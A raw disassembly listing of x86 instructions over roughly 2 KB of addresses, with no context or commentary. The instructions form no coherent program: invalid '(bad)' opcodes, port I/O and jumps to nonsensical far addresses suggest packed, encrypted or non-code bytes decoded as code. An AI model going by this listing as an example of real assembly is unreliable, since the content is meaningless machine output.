  406056:	daa    
  406057:	xchg   esi,eax
  406058:	loopne 0x4060ac
  40605a:	int    0xa7
  40605c:	enter  0x6fa7,0x5a
  406060:	xchg   esi,eax
  406061:	fs jb  0x40602c
  406064:	pop    ebp
  406065:	lea    ebx,[edx-0x73c7f7d9]
  40606b:	mov    DWORD PTR [esi+0x37],esp
  40606e:	mov    esp,0x2dc33fc4
  406073:	div    BYTE PTR [ecx+esi*2-0x41]
  406077:	sbb    bl,al
  406079:	not    DWORD PTR [edx]
  40607b:	add    DWORD PTR [edi+0x6f12d98a],eax
  406081:	push   es
  406082:	cld    
  406083:	inc    edx
  406084:	or     BYTE PTR [eax],ah
  406086:	sub    al,0x58
  406088:	dec    edi
  406089:	mov    edi,0xc535ac76
  40608f:	(bad)  
  406090:	adc    al,0x6
  406092:	sub    eax,0xffc2c4f5
  406097:	popa   
  406098:	ins    DWORD PTR es:[edi],dx
  406099:	test   BYTE PTR ds:0x3fd4b4ce,bh
  40609f:	in     al,dx
  4060a0:	lods   eax,DWORD PTR ds:[esi]
  4060a1:	push   ecx
  4060a2:	or     esi,edi
  4060a4:	out    dx,al
  4060a5:	daa    
  4060a6:	out    dx,al
  4060a7:	mov    dh,0x5a
  4060a9:	pop    esp
  4060aa:	mov    BYTE PTR [edx-0x9],0xef
  4060ae:	enter  0x20a7,0xa5
  4060b2:	in     eax,dx
  4060b3:	sar    DWORD PTR [ebx],cl
  4060b5:	cmp    al,0x7c
  4060b7:	add    bl,dh
  4060b9:	loop   0x4060dd
  4060bb:	mov    edx,0x3d9b85b1
  4060c0:	sti    
  4060c1:	(bad)  
  4060c2:	test   al,0x8b
  4060c4:	inc    ecx
  4060c5:	mov    dl,0xaf
  4060c7:	xor    ebp,ebp
  4060c9:	push   0x4b1e707c
  4060ce:	shr    DWORD PTR [edx+edi*1+0x5b2f8c2e],0xe
  4060d6:	add    BYTE PTR [ebp-0x22d3fafb],cl
  4060dc:	push   0xf8a570c0
  4060e1:	push   es
  4060e2:	and    al,0x5a
  4060e4:	into   
  4060e5:	pushf  
  4060e6:	(bad)  
  4060e7:	pop    ds
  4060e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e9:	pushf  
  4060ea:	loopne 0x406156
  4060ec:	mov    edi,0xf642fd14
  4060f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060f2:	adc    eax,0xeb779220
  4060f7:	mov    edi,0x6e0c1e6d
  4060fc:	lahf   
  4060fd:	adc    dl,BYTE PTR [ebp+ebx*4+0x3a]
  406101:	popa   
  406102:	cmc    
  406103:	call   0xf320077e
  406108:	cdq    
  406109:	cmp    DWORD PTR ds:0xd7b5a8ac,esp
  40610f:	jno    0x4060e4
  406111:	ins    DWORD PTR es:[edi],dx
  406112:	pushf  
  406113:	repz xchg ebx,eax
  406115:	jo     0x40615b
  406117:	stc    
  406118:	sub    eax,ebp
  40611a:	cmp    BYTE PTR [ebx+0x5448e5b6],al
  406120:	out    dx,eax
  406121:	mov    al,ds:0xb57c639e
  406126:	sub    BYTE PTR [ecx+0xe],al
  406129:	jl     0x4060fc
  40612b:	ss xor eax,eax
  40612e:	jmp    0x5e521209
  406133:	mov    DWORD PTR [ebx],edi
  406135:	xor    al,0x71
  406137:	mov    ecx,0x97091e
  40613c:	cmp    bl,BYTE PTR [edx-0x1d6adb43]
  406142:	pop    ebx
  406143:	add    BYTE PTR [edx*8-0x748e3587],0x7d
  40614b:	push   ecx
  40614c:	icebp  
  40614d:	xchg   edx,eax
  40614e:	imul   ebx,DWORD PTR [edi+0x29b67c7f],0x42207f31
  406158:	mov    WORD PTR [ebp-0xcade14],ds
  40615e:	lock rcl dh,cl
  406161:	rcr    BYTE PTR [ecx],0x56
  406164:	push   cs
  406165:	bound  ecx,QWORD PTR [ebx+0xa830f08]
  40616b:	mov    edi,0xc61d63da
  406170:	loopne 0x406124
  406172:	jp     0x406133
  406174:	jg     0x40613f
  406176:	mov    ds:0xe04a42f,al
  40617b:	test   al,0xde
  40617d:	dec    edi
  40617e:	ins    BYTE PTR es:[edi],dx
  40617f:	in     eax,0x7d
  406181:	sub    ebp,ebx
  406183:	cmp    eax,0x1a5819d9
  406188:	sahf   
  406189:	mov    dl,0x69
  40618b:	into   
  40618c:	fistp  DWORD PTR [ecx-0x45282cb4]
  406192:	dec    edx
  406193:	push   ds
  406194:	adc    bl,BYTE PTR [eax]
  406196:	xchg   DWORD PTR [ecx-0xdf57676],eax
  40619c:	shl    edx,cl
  40619e:	daa    
  40619f:	jp     0x4061f7
  4061a1:	pop    ss
  4061a2:	and    edx,DWORD PTR ds:0xe9fb3803
  4061a8:	dec    esp
  4061a9:	pop    ecx
  4061aa:	add    eax,0xd568c204
  4061af:	xchg   edi,eax
  4061b0:	in     eax,0x30
  4061b2:	dec    ebp
  4061b3:	fwait
  4061b4:	push   eax
  4061b5:	mov    cl,0x5a
  4061b7:	push   0x5e198520
  4061bc:	xlat   BYTE PTR ds:[ebx]
  4061bd:	mov    esp,0x2a82599a
  4061c2:	xlat   BYTE PTR ds:[ebx]
  4061c3:	mov    eax,ds:0xdceeca68
  4061c8:	sub    BYTE PTR [edx+0x46202dc5],ah
  4061ce:	cdq    
  4061cf:	popf   
  4061d0:	mov    dl,0xd0
  4061d2:	mov    ebp,0xa7f4ae96
  4061d7:	add    ebp,DWORD PTR ds:0x5554ef89
  4061dd:	sahf   
  4061de:	add    al,0x65
  4061e0:	push   ecx
  4061e1:	enter  0xab47,0x74
  4061e5:	or     eax,DWORD PTR [ebx+0x718ecaed]
  4061eb:	mov    ebp,0xee9cac50
  4061f0:	fisubr DWORD PTR [ecx+0x66]
  4061f3:	inc    ebp
  4061f4:	dec    edi
  4061f5:	jge    0x4061aa
  4061f7:	out    dx,eax
  4061f8:	jg     0x40618f
  4061fa:	shl    DWORD PTR [edx+0x5e732684],1
  406200:	jmp    0x64b4f4c5
  406205:	xchg   edi,eax
  406206:	and    al,0xe9
  406208:	lock pop ebx
  40620a:	outs   dx,BYTE PTR ds:[esi]
  40620c:	mov    cl,0x4f
  40620e:	rol    BYTE PTR [edx],cl
  406210:	jmp    0xd8d7:0xd7e76f3e
  406217:	xor    edi,DWORD PTR [edx]
  406219:	and    al,0x25
  40621b:	loopne 0x40624d
  40621d:	sti    
  40621e:	imul   ecx,DWORD PTR [edi+0x5ec64332],0xcf9924cc
  406228:	adc    DWORD PTR [ebp+eax*8+0x61dd7885],edi
  40622f:	xchg   esi,eax
  406230:	mov    ebx,0x9a4ab4ed
  406235:	add    al,0xa3
  406237:	inc    ebp
  406238:	retf   0x8af1
  40623b:	adc    DWORD PTR [eax+0x747f6b18],ecx
  406241:	pop    ds
  406242:	inc    ecx
  406243:	mov    ebx,0x992259d8
  406248:	fild   WORD PTR [esi+0x1f21fc36]
  40624e:	pop    esi
  40624f:	arpl   dx,bp
  406251:	fbstp  TBYTE PTR [ebx]
  406253:	push   eax
  406254:	mov    WORD PTR gs:[edi],?
  406257:	les    eax,FWORD PTR [ecx+edi*8]
  40625a:	inc    esp
  40625b:	or     DWORD PTR [esi-0x5ede252e],0x9fcf9ab
  406265:	sar    ebp,cl
  406267:	jmp    0xfc68:0x8f05d4c8
  40626e:	mov    ?,WORD PTR [esi+0x6e0703f]
  406274:	sub    BYTE PTR [edx+0x59],dl
  406277:	dec    edx
  406278:	div    ecx
  40627a:	jne    0x406233
  40627c:	dec    ebx
  40627d:	xor    al,0xb8
  40627f:	sub    eax,0xa03c6704
  406284:	mov    edx,0x95a5f3e3
  406289:	pop    ebp
  40628a:	and    eax,0x481099dd
  40628f:	inc    edx
  406290:	sub    dl,bl
  406292:	add    al,0x14
  406294:	cmp    esp,edx
  406296:	add    bh,BYTE PTR [ebp-0x696f477b]
  40629c:	cmc    
  40629d:	stc    
  40629e:	jno    0x406300
  4062a0:	outs   dx,DWORD PTR ds:[esi]
  4062a1:	and    DWORD PTR [eax+0x93a4ed0],esi
  4062a7:	adc    DWORD PTR [esi-0x7e],ebp
  4062aa:	pop    ecx
  4062ab:	ins    BYTE PTR es:[edi],dx
  4062ac:	sub    DWORD PTR [ebx-0x6a],0x1c
  4062b0:	adc    esi,ebp
  4062b2:	pop    edi
  4062b3:	shld   eax,ebx,cl
  4062b6:	sti    
  4062b7:	or     DWORD PTR [esi-0x72eb83ee],ecx
  4062bd:	fnstcw WORD PTR [ecx]
  4062bf:	xor    ebx,DWORD PTR ss:[eax+0x1561862b]
  4062c6:	jae    0x40625a
  4062c8:	xchg   BYTE PTR [ebp-0x4bb68a59],dl
  4062ce:	es stos DWORD PTR es:[edi],eax
  4062d0:	mov    dl,0x5f
  4062d2:	int    0xa
  4062d4:	scas   al,BYTE PTR es:[edi]
  4062d5:	mov    WORD PTR [ebx+0x2e040],fs
  4062db:	mov    ebp,0xced16e40
  4062e0:	std    
  4062e1:	sbb    eax,0x16705961
  4062e6:	outs   dx,DWORD PTR ds:[esi]
  4062e7:	ja     0x406330
  4062e9:	add    al,0x36
  4062eb:	mov    dh,0xab
  4062ed:	mov    eax,ds:0x72d09d78
  4062f2:	out    0x78,eax
  4062f4:	jae    0x40629c
  4062f6:	sti    
  4062f7:	cli    
  4062f8:	xlat   BYTE PTR ds:[ebx]
  4062f9:	stos   DWORD PTR es:[edi],eax
  4062fa:	adc    eax,DWORD PTR [ebp+0x12]
  4062fd:	and    al,0x1c
  4062ff:	adc    DWORD PTR [edx-0x5],edi
  406302:	dec    esp
  406303:	or     bl,al
  406305:	loope  0x4062a5
  406307:	into   
  406308:	dec    edi
  406309:	jle    0x4062bd
  40630b:	mov    ds:0xdd237b35,al
  406310:	(bad)  
  406312:	push   ds
  406313:	arpl   WORD PTR [edx-0x435cbd24],di
  406319:	(bad)  
  40631a:	adc    al,0x31
  40631c:	mov    cl,0x1a
  40631e:	ret    0xcdf4
  406321:	dec    ecx
  406322:	inc    ecx
  406323:	adc    DWORD PTR [ebx],esp
  406325:	das    
  406326:	fld    QWORD PTR [esp+edx*2-0x1]
  40632a:	mov    eax,ds:0x7a1c7da5
  40632f:	call   0x3e8714b
  406334:	pop    esi
  406335:	enter  0xa0bc,0xdd
  406339:	sbb    esp,DWORD PTR [edx+0x17862e6d]
  40633f:	shl    BYTE PTR [ebx-0x58e1302],cl
  406345:	cmp    bh,BYTE PTR [ebx-0x552aada7]
  40634b:	je     0x406318
  40634d:	cdq    
  40634e:	pop    es
  40634f:	mov    edx,0xfeafda0a
  406354:	sub    al,0x58
  406356:	inc    esp
  406357:	mov    dh,0x63
  406359:	in     eax,0xad
  40635b:	sbb    al,0x34
  40635d:	adc    eax,0x5a58254a
  406362:	dec    edx
  406363:	cld    
  406364:	ror    BYTE PTR [edi+eiz*2],0x5f
  406368:	das    
  406369:	icebp  
  40636a:	imul   ebp,DWORD PTR [ecx+0x41],0xffffffff
  40636e:	cmp    eax,0x38e9fb8a
  406373:	or     DWORD PTR [edi],ebx
  406375:	jg     0x4063aa
  406377:	dec    esi
  406378:	adc    al,0x49
  40637a:	push   ecx
  40637b:	test   DWORD PTR [esi-0x45eae23a],ebx
  406381:	and    ebx,DWORD PTR [esi]
  406383:	sahf   
  406384:	rol    DWORD PTR [ebx-0x1f6699f],0x55
  40638b:	shl    BYTE PTR [ebx-0x54],0x98
  40638f:	retf   0x7c88
  406392:	(bad)  
  406393:	loop   0x4063a1
  406395:	xchg   edx,eax
  406396:	jb     0x406371
  406398:	fldcw  WORD PTR [ecx+0x4ced4515]
  40639e:	hlt    
  40639f:	dec    DWORD PTR [edx]
  4063a1:	mov    esi,0xa7d0925d
  4063a6:	sub    DWORD PTR [ebx+ebp*1],ecx
  4063a9:	or     DWORD PTR [esi],0x5af28358
  4063af:	mov    cl,0x86
  4063b2:	stos   BYTE PTR es:[edi],al
  4063b3:	or     ah,ah
  4063b5:	test   al,0x7d
  4063b7:	sti    
  4063b8:	pushf  
  4063b9:	leave  
  4063ba:	fldenv [esi+0x61]
  4063bd:	nop
  4063be:	(bad)  
  4063bf:	mov    ch,0x55
  4063c1:	test   ecx,edi
  4063c3:	xchg   edx,eax
  4063c4:	sbb    al,0x3a
  4063c6:	mov    dh,0xdd
  4063c8:	leave  
  4063c9:	mov    edx,0x48ae5be8
  4063ce:	add    dh,cl
  4063d0:	test   al,0xbd
  4063d2:	sar    DWORD PTR [edi-0xde0cea0],0x69
  4063d9:	nop
  4063da:	xchg   esi,eax
  4063db:	pop    edi
  4063dc:	loope  0x40636b
  4063de:	push   edx
  4063df:	js     0x406379
  4063e1:	data16 aam 0x4
  4063e4:	xchg   BYTE PTR [ecx+ebx*4],dh
  4063e7:	mov    al,ds:0x509d62a2
  4063ec:	ret    
  4063ed:	pop    ds
  4063ee:	dec    ebx
  4063ef:	call   0x258496c5
  4063f4:	adc    bl,BYTE PTR [ecx+0x6d]
  4063f7:	inc    esp
  4063f8:	pop    ss
  4063f9:	rcr    BYTE PTR [ebx+0x71],1
  4063fc:	sub    ebp,DWORD PTR [ebx-0x6d]
  4063ff:	jp     0x4063de
  406401:	add    esp,DWORD PTR [ebx+edi*8-0x5692d51d]
  406408:	mov    esi,0xc535b741
  40640d:	call   0x2e80:0x82445b8a
  406414:	std    
  406415:	pusha  
  406416:	loop   0x4063cc
  406418:	pushf  
  406419:	jg     0x40645f
  40641b:	daa    
  40641c:	adc    bh,bl
  40641e:	mov    bl,0x27
  406420:	stos   BYTE PTR es:[edi],al
  406421:	pop    edx
  406422:	xchg   esp,eax
  406423:	fsin   
  406425:	stos   DWORD PTR es:[edi],eax
  406426:	in     eax,0x6a
  406428:	out    dx,eax
  406429:	imul   ebp,DWORD PTR [esp+ebp*1+0x2a5dfd49],0x61eeb123
  406434:	push   cs
  406435:	leave  
  406436:	xchg   edi,eax
  406437:	cli    
  406438:	arpl   WORD PTR [edi+0x4d2e3a56],si
  40643e:	or     DWORD PTR [ecx+0x73],0xffffffd0
  406442:	pop    ecx
  406443:	ja     0x4063fd
  406445:	xchg   esp,eax
  406446:	pop    esp
  406447:	mov    dh,0x8d
  406449:	push   esi
  40644a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40644b:	sbb    BYTE PTR [edi-0x44],al
  40644e:	xor    eax,0x51f5e6e0
  406453:	outs   dx,DWORD PTR ds:[esi]
  406454:	lahf   
  406455:	fimul  WORD PTR [edi]
  406457:	imul   eax,ecx,0xb6748ae
  40645d:	fcom   QWORD PTR [ebp+0xb]
  406460:	mov    ecx,0x11ba3017
  406465:	mov    bh,0x9
  406467:	xchg   BYTE PTR [ebx],ah
  406469:	sub    BYTE PTR [esi-0x59],dl
  40646c:	xchg   ecx,eax
  40646d:	popa   
  40646e:	fmul   QWORD PTR [ecx-0x16dc75a9]
  406474:	shl    BYTE PTR [esi],0xc9
  406477:	xor    DWORD PTR ds:0xd95a9b6e,0x956b8524
  406481:	int    0x37
  406483:	sub    DWORD PTR [eax+0x27],esp
  406486:	xchg   BYTE PTR [eax],cl
  406488:	mov    ds:0x5fd0714c,al
  40648d:	sbb    eax,0x338f2d91
  406492:	fnstcw WORD PTR [esi]
  406494:	lea    edi,[edi-0x2b]
  406497:	repz xor edi,DWORD PTR [ebx-0x51]
  40649b:	cwde   
  40649c:	cmp    BYTE PTR [eax+ebx*8-0x7834c3a6],ah
  4064a3:	bound  ebp,QWORD PTR [ebp+0x3a2ece36]
  4064a9:	jecxz  0x406499
  4064ab:	add    al,0xfc
  4064ad:	add    al,0x69
  4064af:	ja     0x406477
  4064b1:	mov    esi,0xd89ba6be
  4064b6:	or     al,0x3
  4064b8:	mov    dh,0xc7
  4064ba:	lds    edx,FWORD PTR [ebp+0x71]
  4064bd:	fwait
  4064be:	aad    0x20
  4064c0:	and    DWORD PTR [edx+0x1289377f],0xd1a6aa66
  4064ca:	hlt    
  4064cb:	sbb    BYTE PTR [ebx],dl
  4064cd:	popf   
  4064ce:	push   esi
  4064cf:	xor    DWORD PTR ds:0x78fecd88,ebp
  4064d5:	push   eax
  4064d6:	loope  0x40650c
  4064d8:	test   BYTE PTR [edi-0x28c47e7b],dh
  4064de:	lahf   
  4064df:	xchg   esi,eax
  4064e0:	inc    ecx
  4064e1:	call   0x990:0x41d453c8
  4064e8:	in     eax,dx
  4064e9:	xor    BYTE PTR [edi],bl
  4064eb:	sub    al,0x21
  4064ed:	je     0x406511
  4064ef:	aaa    
  4064f0:	aaa    
  4064f1:	cli    
  4064f2:	aad    0x93
  4064f4:	jmp    0x1008:0x4569b35b
  4064fb:	imul   ecx,edi,0x37fe1002
  406501:	jmp    0x4064fe
  406503:	cs jo  0x406505
  406506:	(bad)  
  406507:	nop
  406508:	pop    ebp
  406509:	(bad)  
  40650a:	sbb    al,dl
  40650c:	push   edx
  40650d:	pop    edi
  40650e:	inc    ebp
  40650f:	popa   
  406510:	ret    0x5fb4
  406513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406514:	push   0xffffffa0
  406516:	lock hlt 
  406518:	and    DWORD PTR [ecx],ecx
  40651a:	pusha  
  40651b:	cmp    eax,0x25039a0
  406520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406521:	iret   
  406522:	icebp  
  406523:	ds pop ds
  406525:	mov    dh,0xdf
  406527:	push   esi
  406528:	xor    al,0xc1
  40652a:	sahf   
  40652b:	mov    esp,DWORD PTR [ebx+0x32802e27]
  406531:	xor    BYTE PTR [edx-0x4932d4bb],bh
  406537:	hlt    
  406538:	aas    
  406539:	adc    eax,DWORD PTR [ebx-0xd597998]
  40653f:	mov    al,ds:0xaf509d80
  406544:	adc    ebx,DWORD PTR [esi]
  406546:	lds    edx,FWORD PTR [eax]
  406548:	jge    0x4064e5
  40654a:	leave  
  40654b:	add    BYTE PTR [esi+0x41a4d97],ch
  406551:	dec    ebx
  406552:	call   0x341e:0xa8049ae0
  406559:	aaa    
  40655a:	push   0xfffffff8
  40655c:	adc    dl,BYTE PTR [esi+eiz*8-0x6a44fce1]
  406563:	sbb    eax,0x79e17c44
  406568:	pop    edx
  406569:	or     al,0x5b
  40656b:	mov    dh,0xff
  40656d:	xor    BYTE PTR [ebx-0x42],al
  406570:	mov    esp,ebp
  406572:	jl     0x4065a1
  406574:	out    0x2d,al
  406576:	sbb    al,0xdc
  406578:	pop    es
  406579:	dec    edi
  40657a:	fs xchg esi,eax
  40657c:	shr    DWORD PTR [eax+0x289b8de],1
  406582:	rcl    dl,1
  406584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406585:	retf   0x7a0a
  406588:	mov    eax,0xea757fbd
  40658d:	out    0x5b,al
  40658f:	lds    eax,FWORD PTR [eax+esi*4]
  406592:	cli    
  406593:	dec    eax
  406594:	aam    0x1d
  406596:	movaps xmm4,xmm2
  406599:	push   eax
  40659a:	shl    DWORD PTR [ebp+0x35b5cd2c],cl
  4065a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a1:	fnstcw WORD PTR [esi-0x312e605b]
  4065a7:	adc    BYTE PTR [bx+si],dl
  4065aa:	(bad)  
  4065ab:	pushf  
  4065ac:	dec    bh
  4065ae:	ins    DWORD PTR es:[edi],dx
  4065af:	stos   DWORD PTR es:[edi],eax
  4065b0:	mov    bl,0x7e
  4065b2:	sub    BYTE PTR ds:0xf317d097,bh
  4065b8:	mov    ah,0x95
  4065ba:	dec    eax
  4065bb:	lock pusha 
  4065bd:	mov    eax,fs:0x17975194
  4065c3:	mov    eax,0x888c45bf
  4065c8:	sub    DWORD PTR [ebx+0x32],0xb0b0ff84
  4065cf:	pop    esi
  4065d0:	in     eax,dx
  4065d1:	pop    esi
  4065d2:	std    
  4065d3:	mov    esp,0xc423a2f1
  4065d8:	aad    0xa3
  4065da:	dec    ecx
  4065db:	sub    al,0x4f
  4065dd:	in     eax,0x25
  4065df:	addr16 pop ebx
  4065e1:	sub    BYTE PTR [ecx-0x12],ch
  4065e4:	aam    0x63
  4065e6:	sbb    al,0x37
  4065e8:	cmp    DWORD PTR [esp+edi*8],esp
  4065eb:	pop    ds
  4065ec:	ficom  WORD PTR [ebp+0x9]
  4065ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065f0:	jmp    0x15ce8d78
  4065f5:	fwait
  4065f6:	call   FWORD PTR ds:0xba717ba9
  4065fc:	jge    0x40659a
  4065fe:	sub    eax,0x2c735d51
  406603:	mov    al,ds:0x353e9aaf
  406608:	push   eax
  406609:	arpl   cx,ax
  40660b:	adc    al,0xfd
  40660d:	mov    esi,edx
  40660f:	push   ebx
  406610:	cmp    ah,bh
  406612:	std    
  406613:	and    al,0xde
  406615:	or     cl,BYTE PTR es:[ebx]
  406618:	pop    ecx
  406619:	xchg   ebp,eax
  40661a:	inc    esp
  40661b:	std    
  40661c:	cmp    al,0x9
  40661e:	les    ebx,FWORD PTR [ebp+0x66173f4f]
  406624:	pushf  
  406625:	cmp    DWORD PTR [esi+0x19],esp
  406628:	nop
  406629:	jb     0x4065bd
  40662b:	xchg   ebx,eax
  40662c:	mov    ds:0x2b470617,al
  406631:	push   0xffffffcc
  406633:	sbb    ebx,DWORD PTR [ecx-0x78fc284f]
  406639:	pushf  
  40663a:	add    esi,DWORD PTR [ecx]
  40663c:	push   cs
  40663d:	js     0x4065d0
  40663f:	jns    0x4066a8
  406641:	pusha  
  406642:	xchg   BYTE PTR [edx],bl
  406644:	mov    ecx,0x7d68ae04
  406649:	jbe    0x4066aa
  40664b:	dec    edx
  40664c:	mov    ecx,0xbcf55686
  406651:	cmp    edi,DWORD PTR [ecx]
  406653:	mov    ch,0xd3
  406655:	mov    edx,0x985e871e
  40665a:	call   0xa2bba58e
  40665f:	jle    0x406604
  406661:	jmp    0x406632
  406663:	xchg   ebx,eax
  406664:	push   ebx
  406665:	rcl    BYTE PTR [eax+0x57],1
  406668:	and    edi,DWORD PTR [ecx]
  40666a:	pusha  
  40666b:	jmp    0x406659
  40666d:	pop    ds
  40666e:	add    BYTE PTR [edx],ah
  406670:	mov    dl,0x97
  406672:	xchg   ebp,eax
  406673:	test   ah,0x30
  406676:	mov    cl,0x85
  406678:	cmp    eax,0x74ce8f4d
  40667d:	lahf   
  40667e:	scas   eax,DWORD PTR es:[edi]
  40667f:	xchg   esp,eax
  406680:	mov    dh,0x17
  406682:	sub    al,0x22
  406684:	or     BYTE PTR [edi+eiz*1-0x4d],bl
  406688:	jmp    0x406632
  40668a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40668b:	out    0x92,eax
  40668d:	sbb    dh,BYTE PTR [esi+0x4]
  406690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406691:	imul   ecx,ebx,0xb
  406694:	dec    edi
  406695:	in     eax,0x5e
  406697:	fcmovnb st,st(7)
  406699:	xchg   ebx,eax
  40669a:	aad    0xa2
  40669c:	psrad  mm6,QWORD PTR [edi+0xc]
  4066a0:	repnz fcomp DWORD PTR [eax+0x30]
  4066a4:	adc    ebp,ebx
  4066a6:	ins    BYTE PTR es:[edi],dx
  4066a7:	add    DWORD PTR [eax+edx*2+0x1],edx
  4066ab:	fnstenv [edx]
  4066ad:	dec    edi
  4066ae:	mov    bh,0x7b
  4066b0:	xchg   edi,eax
  4066b1:	push   es
  4066b2:	ss mov bh,0xc1
  4066b5:	ins    BYTE PTR es:[edi],dx
  4066b6:	add    eax,0x2a78b4c1
  4066bb:	mov    ebx,0x346c3030
  4066c0:	push   esi
  4066c1:	lods   al,BYTE PTR ds:[esi]
  4066c2:	mov    eax,es:0x3f04ffb0
  4066c8:	push   edi
  4066c9:	call   0x5820:0xd14d97d7
  4066d0:	sbb    eax,0x9549c530
  4066d5:	stos   DWORD PTR es:[edi],eax
  4066d6:	or     al,BYTE PTR [ecx+edx*4]
  4066d9:	shl    bl,cl
  4066db:	add    eax,0x7818e29
  4066e0:	pop    es
  4066e1:	push   esp
  4066e2:	arpl   si,dx
  4066e4:	icebp  
  4066e5:	mov    ah,0x94
  4066e7:	and    esp,DWORD PTR [ecx-0x7a]
  4066ea:	ret    
  4066eb:	out    0x8d,al
  4066ed:	sbb    DWORD PTR [ecx-0x75],ecx
  4066f0:	xor    DWORD PTR [eax-0x57],0xc
  4066f4:	xchg   ebx,eax
  4066f5:	pusha  
  4066f6:	and    eax,0x63c3ee01
  4066fb:	dec    ebx
  4066fc:	mov    ch,0xd5
  4066fe:	add    al,bl
  406700:	out    dx,al
  406701:	add    eax,0xde723de
  406706:	mov    BYTE PTR [ebx],dl
  406708:	aaa    
  406709:	jb     0x40669d
  40670b:	mov    DWORD PTR [edi+ecx*1],ebx
  40670e:	sbb    eax,0x8581e7cd
  406713:	mov    ebp,0xbbe96a6e
  406718:	mov    al,dl
  40671a:	push   ecx
  40671b:	mov    bl,0xd1
  40671d:	sbb    al,0x84
  40671f:	xor    BYTE PTR [ebp-0x9],ah
  406722:	mov    edi,0xbcf29c42
  406727:	idiv   DWORD PTR [ecx-0x5dff1c9e]
  40672d:	pop    ds
  40672e:	cmc    
  40672f:	pusha  
  406730:	shl    DWORD PTR [eax-0x59],0x52
  406734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406735:	adc    eax,0xbf2d7e2
  40673a:	outs   dx,BYTE PTR ds:[esi]
  40673b:	mov    esi,0x59500f19
  406740:	and    BYTE PTR cs:[edi-0x111d599f],cl
  406747:	lock xor DWORD PTR [edi-0x41],0xf88c3fa4
  40674f:	mov    ecx,0x79b40792
  406754:	enter  0x2bef,0x6c
  406758:	aam    0x46
  40675a:	dec    esp
  40675b:	cdq    
  40675c:	in     al,dx
  40675d:	pushf  
  40675e:	int3   
  40675f:	pop    ebx
  406760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406761:	mov    BYTE PTR [ebx+0x72],ah
  406764:	xchg   edx,eax
  406765:	cdq    
  406766:	xchg   ebp,eax
  406767:	stos   DWORD PTR es:[edi],eax
  406768:	xchg   edi,eax
  406769:	mov    cl,0x41
  40676b:	jp     0x40676a
  40676d:	pop    esp
  40676e:	pusha  
  40676f:	cmp    al,0x2
  406771:	call   0xf8b3b186
  406776:	mov    edx,0x9b29a864
  40677b:	push   cs
  40677c:	mov    ebx,esi
  40677e:	cdq    
  40677f:	lahf   
  406780:	stos   BYTE PTR es:[edi],al
  406781:	inc    ecx
  406782:	inc    esp
  406783:	(bad)  
  406784:	pop    ss
  406785:	push   es
  406786:	sub    al,0xdd
  406788:	fisubr WORD PTR [esi+0x2a]
  40678b:	loopne 0x4067c7
  40678d:	int    0x3d
  40678f:	div    bl
  406791:	jae    0x406783
  406793:	cmc    
  406794:	ror    BYTE PTR [edi],0xf7
  406797:	jl     0x4067b2
  406799:	pop    edi
  40679a:	cmc    
  40679b:	mov    edx,0xc568e32d
  4067a0:	push   esp
  4067a1:	push   edx
  4067a2:	in     eax,dx
  4067a3:	sub    BYTE PTR [edi-0x4d],ch
  4067a6:	mov    esi,0x64b6149e
  4067ab:	adc    ebx,DWORD PTR [ebp-0x43]
  4067ae:	sbb    DWORD PTR [edx-0x734e5a9b],ebp
  4067b4:	xchg   ebp,eax
  4067b5:	test   al,0x71
  4067b7:	cli    
  4067b8:	das    
  4067b9:	sub    esp,esp
  4067bb:	ds ja  0x40676a
  4067be:	sub    DWORD PTR [ecx],ecx
  4067c0:	cdq    
  4067c1:	lahf   
  4067c2:	popf   
  4067c3:	jne    0x406778
  4067c5:	push   ebx
  4067c6:	mov    dh,0x30
  4067c8:	out    0x4a,al
  4067ca:	aam    0x4e
  4067cc:	mov    dl,0xc3
  4067ce:	mov    esi,edi
  4067d0:	add    esp,esi
  4067d2:	mov    ch,0xf1
  4067d4:	sub    eax,0x8dc7f002
  4067d9:	mov    eax,0xce3c967d
  4067de:	pushf  
  4067df:	div    BYTE PTR [edx+0x14]
  4067e2:	fwait
  4067e3:	into   
  4067e4:	out    0xcb,al
  4067e6:	adc    al,0xf7
  4067e8:	mov    WORD PTR [esi-0x2],?
  4067eb:	cmp    ah,ch
  4067ed:	and    al,0x89
  4067ef:	inc    edi
  4067f0:	jne    0x40678c
  4067f2:	and    dh,BYTE PTR [ebx-0x3ca9a586]
  4067f8:	xchg   edx,eax
  4067f9:	push   ebp
  4067fa:	jmp    0x40686b
  4067fc:	adc    ecx,esi
  4067fe:	mov    edi,0xa5a22535
  406803:	mov    ah,0x3f
  406805:	in     eax,dx
  406806:	push   cs
  406807:	jge    0x406796
  406809:	mov    esi,0x217383df
  40680e:	ins    BYTE PTR es:[edi],dx
  40680f:	ins    BYTE PTR es:[edi],dx
  406810:	jo     0x4067f2
  406812:	xchg   ebp,eax
  406813:	mov    edi,0x3a4776c8
  406818:	pusha  
  406819:	jnp    0x406892
  40681b:	mov    ah,0x90
  40681d:	cmc    
  40681e:	pop    edx
  40681f:	jecxz  0x40685e
  406821:	and    ebp,edx
  406823:	in     al,dx
  406824:	and    DWORD PTR [ebx-0xa924cc0],esi
  40682a:	pop    ds
  40682b:	(bad)  
  40682c:	and    BYTE PTR [esi],al
  40682e:	push   DWORD PTR [ebp+0x597d5226]
  406834:	push   eax
  406835:	push   0x13
  406837:	and    BYTE PTR [eax+0x78db5f36],dl
  40683d:	xchg   edx,eax
  40683e:	ficomp DWORD PTR [ebp+0x26]
  406841:	lods   eax,DWORD PTR ds:[esi]
  406842:	mov    ss,WORD PTR [esi+0x29ce5f2]
  406848:	jbe    0x406864
  40684a:	test   BYTE PTR [esi-0x6d79d184],bl
  406850:	fisubr DWORD PTR [ebp+0x2f]
  406853:	mov    ebp,0xa0c2edaf
  406858:	cmp    al,0xeb
  40685a:	push   ebp
  40685b:	iret   
  40685c:	pminub mm0,QWORD PTR [esi+0x40]
  406860:	paddd  mm3,QWORD PTR [esi-0xbeacd21]
  406867:	inc    eax
